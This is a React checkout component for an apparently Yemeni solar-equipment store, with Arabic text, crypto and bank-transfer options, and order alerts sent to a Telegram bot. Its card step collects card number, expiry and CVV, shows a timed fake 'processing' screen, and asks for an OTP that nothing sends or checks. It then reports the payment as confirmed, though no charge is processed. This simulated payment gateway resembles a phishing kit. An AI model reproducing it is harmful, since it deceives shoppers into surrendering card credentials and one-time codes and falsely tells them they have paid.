
import React, { useState, useEffect, useRef } from 'react';
import { Product, ShippingInfo, UserProfile } from '../types';
import { NotificationService } from '../services/notificationService';

interface CheckoutViewProps {
  product: Product;
  onCancel: () => void;
  user: UserProfile | null;
}

type CheckoutStep = 'shipping' | 'payment-method' | 'process-card' | 'process-crypto' | 'process-kuraimi' | 'processing' | 'otp-verify' | 'success';

const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) => {
  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shipping, setShipping] = useState<ShippingInfo>({ 
    fullName: user?.name || '', 
    phone: '', 
    city: '', 
    address: '' 
  });
  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: user?.name?.toUpperCase() || '' });
  const [cardError, setCardError] = useState('');
  const [otp, setOtp] = useState('');
  const [proofImage, setProofImage] = useState<string | null>(null);
  const [isManualPayment, setIsManualPayment] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [step]);

  const luhnCheck = (num: string) => {
    const arr = (num + '').split('').reverse().map(x => parseInt(x));
    const lastDigit = arr.shift();
    let sum = arr.reduce((acc, val, i) => (i % 2 !== 0 ? acc + val : acc + ((val *= 2) > 9 ? val - 9 : val)), 0);
    sum += lastDigit!;
    return sum % 10 === 0;
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setProofImage(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleNextStep = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (step === 'shipping') setStep('payment-method');
    else if (step === 'process-card') {
      const cleanNum = card.number.replace(/\s+/g, '');
      if (cleanNum.length < 16 || !luhnCheck(cleanNum)) {
        setCardError('خطأ: رقم البطاقة غير متوافق مع خوارزمية البنك المصدر.');
        return;
      }
      setCardError('');
      setIsManualPayment(false);
      setStep('processing');
      setTimeout(() => setStep('otp-verify'), 2500);
    } else if (step === 'otp-verify' || step === 'process-crypto' || step === 'process-kuraimi') {
      if (step === 'otp-verify' && otp.length < 4) return;
      if ((step === 'process-crypto' || step === 'process-kuraimi') && !proofImage) {
        alert('يرجى إرفاق صورة إشعار التحويل أولاً لضمان معالجة طلبك.');
        return;
      }
      
      let method = "بطاقة بنكية";
      if (step === 'process-crypto') method = "بينانس / USDT";
      if (step === 'process-kuraimi') method = "بنك الكريمي";

      // إنشاء رابط المنتج المباشر
      const productUrl = `${window.location.origin}/#product-${product.id}`;

      // إرسال الإشعار الكامل للبوت
      NotificationService.sendTelegramNotification(
        NotificationService.formatOrderMessage({
          product: product.name,
          price: `${product.price} ر.س`,
          method: method + (proofImage ? " (مع صورة إثبات)" : ""),
          customer: shipping,
          productUrl: productUrl
        }),
        proofImage
      );

      setStep('processing');
      setTimeout(() => setStep('success'), 2000);
    } else {
      setStep('processing');
      setTimeout(() => setStep('success'), 3000);
    }
  };

  const handleOtherPayment = () => {
    const message = `أهلاً حيفان للطاقة، أريد شراء "${product.name}" بسعر ${product.price} ر.س.\n\nأرغب في استخدام وسيلة دفع أخرى.\n\nبياناتي:\nالاسم: ${shipping.fullName}\nالهاتف: ${shipping.phone}\nالعنوان: ${shipping.city} - ${shipping.address}`;
    
    NotificationService.sendTelegramNotification(
      NotificationService.formatOrderMessage({
        product: product.name,
        price: `${product.price} ر.س`,
        method: "طلب وسيلة دفع أخرى (واتساب)",
        customer: shipping,
        productUrl: `${window.location.origin}/#product-${product.id}`
      })
    );

    window.open(`https://wa.me/967784400333?text=${encodeURIComponent(message)}`, '_blank');
  };

  const renderShipping = () => (
    <div className="max-w-2xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-14 rounded-[3rem] shadow-2xl border border-emerald-50">
        <h2 className="text-3xl font-black text-emerald-950 mb-4">بيانات التوصيل الرسمية</h2>
        <form onSubmit={handleNextStep} className="space-y-6">
          <input type="text" required value={shipping.fullName} onChange={e => setShipping({...shipping, fullName: e.target.value})} placeholder="الاسم الرباعي الكامل" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold" />
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <input type="tel" required value={shipping.phone} onChange={e => setShipping({...shipping, phone: e.target.value})} placeholder="رقم هاتف التواصل 7XXXXXXXX" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold" />
            <input type="text" required value={shipping.city} onChange={e => setShipping({...shipping, city: e.target.value})} placeholder="المحافظة والمدينة" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-black" />
          </div>
          <textarea required value={shipping.address} onChange={e => setShipping({...shipping, address: e.target.value})} placeholder="العنوان السكني التفصيلي (مثلاً: شارع الستين، عمارة...)" className="w-full bg-emerald-50/50 border border-emerald-100 p-5 rounded-2xl outline-none focus:border-emerald-500 font-bold min-h-[120px]" />
          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl mt-8">المتابعة لعملية الدفع الآمن</button>
        </form>
      </div>
    </div>
  );

  const renderPaymentSelection = () => (
    <div className="max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8 px-4">
      <button onClick={() => { setStep('process-card'); setIsManualPayment(false); }} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group">
        <span className="w-24 h-24 bg-blue-600 rounded-[2rem] flex items-center justify-center text-5xl shadow-lg group-hover:scale-110 transition-transform">💳</span>
        <h3 className="text-2xl font-black text-emerald-950">بطاقة بنكية</h3>
        <p className="text-gray-400 font-bold text-sm">فيزا / ماستركارد</p>
      </button>
      
      <button onClick={() => { setStep('process-crypto'); setIsManualPayment(true); }} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group">
        <span className="w-24 h-24 bg-yellow-500 rounded-[2rem] flex items-center justify-center text-5xl shadow-lg group-hover:scale-110 transition-transform">₿</span>
        <h3 className="text-2xl font-black text-emerald-950">بينانس / USDT</h3>
        <p className="text-gray-400 font-bold text-sm">عبر معرف Binance ID</p>
      </button>

      <button onClick={() => { setStep('process-kuraimi'); setIsManualPayment(true); }} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group">
        <span className="w-24 h-24 bg-emerald-700 rounded-[2rem] flex items-center justify-center text-5xl shadow-lg group-hover:scale-110 transition-transform">🏦</span>
        <h3 className="text-2xl font-black text-emerald-950">بنك الكريمي</h3>
        <p className="text-gray-400 font-bold text-sm">حوالة أو إيداع مباشر</p>
      </button>

      <button onClick={handleOtherPayment} className="bg-white p-10 rounded-[3rem] border-2 border-transparent hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group">
        <span className="w-24 h-24 bg-gray-600 rounded-[2rem] flex items-center justify-center text-5xl shadow-lg group-hover:scale-110 transition-transform">💬</span>
        <h3 className="text-2xl font-black text-emerald-950">طريقة دفع أخرى</h3>
        <p className="text-gray-400 font-bold text-sm">تواصل معنا عبر واتساب</p>
      </button>
    </div>
  );

  const renderCryptoPayment = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50 text-center">
        <div className="w-20 h-20 bg-yellow-100 text-yellow-600 rounded-3xl flex items-center justify-center mx-auto mb-8 text-4xl shadow-lg">₿</div>
        <h2 className="text-2xl font-black text-emerald-950 mb-6">الدفع عبر بينانس (USDT)</h2>
        
        <div className="bg-gray-50 p-6 rounded-2xl border border-emerald-100 mb-8 space-y-4">
          <p className="text-xs font-black text-gray-400 uppercase tracking-widest">Binance ID الخاص بنا</p>
          <div className="flex items-center justify-center gap-4">
            <span className="text-3xl font-black text-emerald-900 tracking-wider">939771066</span>
            <button onClick={() => { navigator.clipboard.writeText('939771066'); alert('تم نسخ الـ ID بنجاح'); }} className="p-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-all">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
          </div>
          <p className="text-[11px] text-emerald-600 font-bold">يرجى تحويل مبلغ {product.price} ر.س إلى الـ ID أعلاه.</p>
        </div>

        <div className="space-y-6">
          <p className="text-sm font-bold text-gray-500">يرجى إرفاق صورة إشعار التحويل لتأكيد طلبك:</p>
          
          <div 
            onClick={() => fileInputRef.current?.click()}
            className="w-full h-48 border-2 border-dashed border-emerald-200 rounded-2xl flex flex-col items-center justify-center bg-emerald-50/30 cursor-pointer hover:bg-emerald-50 transition-all overflow-hidden relative"
          >
            {proofImage ? (
              <img src={proofImage} alt="إشعار" className="w-full h-full object-contain p-2" />
            ) : (
              <>
                <svg className="w-12 h-12 text-emerald-400 mb-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
                <span className="text-sm font-black text-emerald-600">اضغط لرفع صورة إشعار التحويل من هاتفك</span>
              </>
            )}
            <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
          </div>

          <button onClick={handleNextStep} className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl">تأكيد عملية الدفع والتحويل</button>
        </div>
      </div>
    </div>
  );

  const renderKuraimiPayment = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50 text-center">
        <div className="w-20 h-20 bg-emerald-100 text-emerald-700 rounded-3xl flex items-center justify-center mx-auto mb-8 text-4xl shadow-lg">🏦</div>
        <h2 className="text-2xl font-black text-emerald-950 mb-6">الدفع عبر بنك الكريمي</h2>
        
        <div className="bg-emerald-900 text-white p-8 rounded-3xl shadow-xl mb-8 text-right relative overflow-hidden">
          <div className="absolute top-0 left-0 w-24 h-24 bg-white/5 blur-2xl rounded-full"></div>
          <div className="space-y-4">
            <div>
              <p className="text-[10px] opacity-50 uppercase font-black">اسم الحساب</p>
              <p className="text-lg font-black">حيفان للطاقة المتجددة</p>
            </div>
            <div>
              <p className="text-[10px] opacity-50 uppercase font-black">رقم الحساب المميز</p>
              <p className="text-3xl font-black tracking-widest text-emerald-300">123456789</p>
            </div>
          </div>
        </div>

        <div className="space-y-6">
          <p className="text-sm font-bold text-gray-500">يرجى إرفاق صورة حوالة الكريمي أو إشعار الإيداع:</p>
          
          <div 
            onClick={() => fileInputRef.current?.click()}
            className="w-full h-48 border-2 border-dashed border-emerald-200 rounded-2xl flex flex-col items-center justify-center bg-emerald-50/30 cursor-pointer hover:bg-emerald-50 transition-all overflow-hidden relative"
          >
            {proofImage ? (
              <img src={proofImage} alt="إشعار" className="w-full h-full object-contain p-2" />
            ) : (
              <>
                <svg className="w-12 h-12 text-emerald-400 mb-3" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
                <span className="text-sm font-black text-emerald-600">اضغط لرفع صورة إثبات الحوالة</span>
              </>
            )}
            <input type="file" ref={fileInputRef} onChange={handleFileChange} accept="image/*" className="hidden" />
          </div>

          <button onClick={handleNextStep} className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl">تأكيد إرسال الحوالة</button>
        </div>
      </div>
    </div>
  );

  const renderCardPayment = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50">
        <form onSubmit={handleNextStep} className="space-y-6">
          {cardError && <div className="p-5 bg-red-50 text-red-600 rounded-2xl text-xs font-black text-center border border-red-100">{cardError}</div>}
          <input type="text" required maxLength={19} value={card.number} onChange={e => {
            const val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            const parts = val.match(/.{1,4}/g) || [];
            setCard({...card, number: parts.join(' ')});
          }} placeholder="0000 0000 0000 0000" className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none focus:border-indigo-500 font-mono text-xl text-center" />
          <input type="text" required value={card.name} onChange={e => setCard({...card, name: e.target.value.toUpperCase()})} placeholder="NAME AS PRINTED" className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none focus:border-indigo-500 font-black uppercase text-center" />
          <div className="grid grid-cols-2 gap-6">
            <input type="text" required placeholder="MM/YY" value={card.expiry} onChange={e => setCard({...card, expiry: e.target.value})} className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none font-black text-center" />
            <input type="password" required maxLength={3} value={card.cvv} onChange={e => setCard({...card, cvv: e.target.value})} placeholder="CVV" className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none font-black text-center" />
          </div>
          <button type="submit" className="w-full bg-indigo-600 text-white py-6 rounded-[2rem] font-black shadow-2xl hover:bg-indigo-700 transition-all text-xl">إرسال طلب التحقق البنكي</button>
        </form>
      </div>
    </div>
  );

  const renderOtpVerify = () => (
    <div className="max-w-xl mx-auto animate-fade-in px-4">
      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50 text-center">
        <div className="w-20 h-20 bg-indigo-50 text-indigo-600 rounded-2xl flex items-center justify-center mx-auto mb-8">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        </div>
        <h2 className="text-2xl font-black text-emerald-950 mb-4">التحقق من الهوية</h2>
        <p className="text-gray-500 font-bold mb-8">تم إرسال رمز التحقق إلى رقم هاتفك المسجل.</p>
        <form onSubmit={handleNextStep} className="space-y-6">
          <input 
            type="text" 
            required 
            maxLength={6} 
            value={otp} 
            onChange={e => setOtp(e.target.value.replace(/[^0-9]/g, ''))} 
            placeholder="0 0 0 0 0 0" 
            className="w-full bg-gray-50 border border-gray-200 p-5 rounded-2xl outline-none focus:border-emerald-500 font-mono text-3xl text-center tracking-[0.5em]" 
          />
          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-emerald-700 transition-all text-xl">تأكيد وإتمام الدفع</button>
        </form>
      </div>
    </div>
  );

  const renderProcessing = () => (
    <div className="max-w-xl mx-auto py-32 text-center space-y-12 animate-fade-in">
       <div className="relative w-36 h-36 mx-auto">
          <div className="absolute inset-0 border-[10px] border-emerald-100 rounded-full" /><div className="absolute inset-0 border-[10px] border-emerald-600 border-t-transparent rounded-full animate-spin" />
       </div>
       <h2 className="text-4xl font-black text-emerald-950">جاري المعالجة...</h2>
    </div>
  );

  const renderSuccess = () => (
    <div className="max-w-2xl mx-auto py-20 animate-fade-in text-center px-4">
       <div className="bg-white p-10 md:p-20 rounded-[4rem] shadow-3xl border border-emerald-50 space-y-10">
          <div className="w-28 h-28 bg-emerald-600 text-white rounded-full flex items-center justify-center mx-auto shadow-2xl ring-[20px] ring-emerald-50"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="4"><polyline points="20 6 9 17 4 12"/></svg></div>
          <h2 className="text-4xl md:text-5xl font-black text-emerald-950">
            {isManualPayment ? 'تم إرسال طلبك بنجاح!' : 'اكتملت العملية!'}
          </h2>
          <p className="text-gray-500 font-bold text-lg leading-relaxed">
            {isManualPayment 
              ? 'تم استلام صورة إثبات التحويل الخاصة بك. معاملتك الآن تحت التنفيذ وسوف يتم التواصل معك في أقرب وقت ممكن لتأكيد الشحن.'
              : 'شكراً لثقتك بـ حيفان للطاقة. تم تأكيد الدفع وجاري تجهيز طلبك للشحن الفوري.'}
          </p>
          <button onClick={onCancel} className="w-full bg-emerald-950 text-white py-6 rounded-[2rem] font-black shadow-xl hover:bg-black transition-all">العودة للرئيسية</button>
       </div>
    </div>
  );

  return (
    <div className="min-h-[80vh] py-10 bg-emerald-50/20">
      <div className="container mx-auto px-6">
        <div className="flex items-center justify-between mb-16">
           <button onClick={onCancel} className="p-4 bg-white rounded-2xl border border-emerald-50 shadow-sm hover:text-emerald-600 transition-colors"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M19 12H5"/><path d="m12 19-7-7 7-7"/></svg></button>
           <h1 className="text-3xl font-black text-emerald-950">بوابة الدفع الرسمية</h1>
        </div>

        <div className="animate-slide-up">
          {step === 'shipping' && renderShipping()}
          {step === 'payment-method' && renderPaymentSelection()}
          {step === 'process-card' && renderCardPayment()}
          {step === 'process-crypto' && renderCryptoPayment()}
          {step === 'process-kuraimi' && renderKuraimiPayment()}
          {step === 'otp-verify' && renderOtpVerify()}
          {step === 'processing' && renderProcessing()}
          {step === 'success' && renderSuccess()}
        </div>
      </div>
    </div>
  );
};

export default CheckoutView;
